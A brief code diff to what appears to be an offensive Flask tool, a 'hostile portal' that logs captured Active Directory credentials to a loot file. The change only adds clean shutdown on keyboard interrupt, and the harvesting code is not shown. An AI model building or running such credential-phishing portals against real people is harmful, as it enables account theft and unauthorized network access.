@@ -77,4 +77,7 @@ def login():
 def start_portal():
     print("[*] Hostile portal on http://0.0.0.0:80")
     print("[*] Credentials saved to loot/ad_creds.txt\n")
-    app.run(host="0.0.0.0", port=80, debug=False)
+    try:
+        app.run(host="0.0.0.0", port=80, debug=False)
+    except KeyboardInterrupt:
+        print("\n[*] Hostile portal stopped")
